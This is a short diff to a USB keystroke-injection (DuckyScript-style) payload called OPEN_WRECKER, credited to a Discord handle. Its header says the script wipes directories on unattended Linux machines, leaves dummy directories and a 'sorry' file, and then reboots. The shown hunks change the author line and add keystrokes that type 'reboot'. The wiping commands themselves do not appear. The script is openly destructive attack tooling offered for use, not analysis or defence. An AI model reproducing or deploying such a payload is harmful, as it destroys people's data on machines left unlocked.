@@ -1,4 +1,4 @@
-HiREM Author: FLIZZ3R
+REM Author: FLIZZ3R
 REM TITLE: OPEN_WRECKER
 REM OBJECTIVE: DESTRUCTIVE!CAUTION! wipe open linux machines Directories then create dummy directories and sorry text file**Added Reboot for shutdown :< shutdown -h now>:***
 
@@ -24,7 +24,7 @@ ENTER
 +DELAY 1000
 +STRING reboot
 +ENTER
-:::FLIZZ3R@DISCORD)))
+:::FLIZZER#3706@DISCORD)))
 
 
 
